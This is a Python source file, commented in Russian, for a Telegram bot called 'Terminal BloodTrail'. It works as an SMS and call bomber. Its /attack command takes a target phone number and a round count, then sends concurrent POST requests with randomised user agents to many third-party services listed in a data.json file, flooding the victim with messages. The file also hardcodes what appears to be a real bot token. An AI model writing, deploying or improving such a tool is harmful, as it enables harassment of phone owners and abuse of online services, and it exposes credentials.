import json
import asyncio
import logging
import aiohttp
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
from fake_useragent import UserAgent

# === КОНФИГУРАЦИЯ ===
TOKEN = "8327514123:AAHlDhGumKA87OPp5cHw4eY65uyGVmIT8B0"

# Определяем путь к файлу базы данных относительно этого скрипта
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_PATH = os.path.join(BASE_DIR, "data.json")

class GlobalState:
    def __init__(self):
        self.is_running = False
        self.stop_requested = False

state = GlobalState()
ua = UserAgent()

# --- ЛОГИКА ОТПРАВКИ ---
async def send_request(name, url, data, status_list):
    if state.stop_requested:
        return
    
    headers = {
        "User-Agent": ua.random,
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=data, headers=headers, timeout=10) as resp:
                status_list.append(f"✅ {name}: {resp.status}")
    except Exception as e:
        status_list.append(f"❌ {name}: Error")

# --- ГЛАВНЫЙ ЦИКЛ ---
async def start_attack_logic(phone, runs, update, context):
    state.is_running = True
    state.stop_requested = False
    chat_id = update.effective_chat.id

    # 1. Пробуем прочитать data.json
    if not os.path.exists(DATA_PATH):
        await context.bot.send_message(chat_id=chat_id, text="❌ Ошибка: Файл <code>data.json</code> !", parse_mode='HTML')
        state.is_running = False
        return

    try:
        with open(DATA_PATH, "r", encoding="utf-8") as f:
            config = json.load(f)
        services = config["services"]
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Ошибка в структуре JSON: {e}")
        state.is_running = False
        return

    await context.bot.send_message(chat_id=chat_id, text=f"🚀 <b>Атака на {phone} запущена!</b>\nСервисов в базе: {len(services)}", parse_mode='HTML')

    for i in range(int(runs)):
        if state.stop_requested: break
        
        current_logs = []
        tasks = []
        fmt_phone = ''.join(filter(str.isdigit, phone))

        for name, s in services.items():
            url = s["url"].replace("%PHONE%", fmt_phone)
            # Глубокая замена номера в данных
            payload = {k: (v.replace("%PHONE%", fmt_phone) if isinstance(v, str) else v) for k, v in s["data"].items()}
            tasks.append(send_request(name, url, payload, current_logs))

        await asyncio.gather(*tasks)
        
        # Отправляем краткий отчет по кругу
        log_text = f"<b>Круг {i+1} завершен.</b>\n" + "\n".join(current_logs[:5]) + "\n..." 
        await context.bot.send_message(chat_id=chat_id, text=log_text, parse_mode='HTML')
        await asyncio.sleep(1)

    final_text = "⛔ <b>Остановлено пользователем</b>" if state.stop_requested else "✅ <b>Все круги пройдены!</b>"
    await context.bot.send_message(chat_id=chat_id, text=final_text, parse_mode='HTML')
    state.is_running = False

# --- ОБРАБОТЧИКИ ---

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ПРОВЕРКА "СИСТЕМА ЗАНЯТА" УДАЛЕНА ПОЛНОСТЬЮ 🚀
    
    if len(context.args) < 2:
        await update.message.reply_text("Используй: <code>/attack [номер] [круги]</code>", parse_mode='HTML')
        return

    phone = context.args[0]
    runs = context.args[1]
    
    # Просто запускаем новую задачу в фоне, не глядя на старые
    asyncio.create_task(start_attack_logic(phone, runs, update, context))

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state.stop_requested = True
    await update.message.reply_text("🛑 Сигнал остановки отправлен...")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("📊 Проверить базу", callback_data='check_db')]]
    await update.message.reply_text(
        "<b>Terminal BloodTrail v1.6</b>\n\n"
        "Для атаки: <code>/attack номер круги</code>\n"
        "Для стопа: <code>/stop</code>",
        reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML'
    )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == 'check_db':
        if os.path.exists(DATA_PATH):
            with open(DATA_PATH, "r") as f:
                data = json.load(f)
            await query.edit_message_text(f"✅ База найдена. Сервисов: {len(data['services'])}")
        else:
            await query.edit_message_text("❌ Файл data.json не найден!")

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CallbackQueryHandler(callback_handler))
    print(">>> Бот готов к деплою на хостинг!")
    app.run_polling()
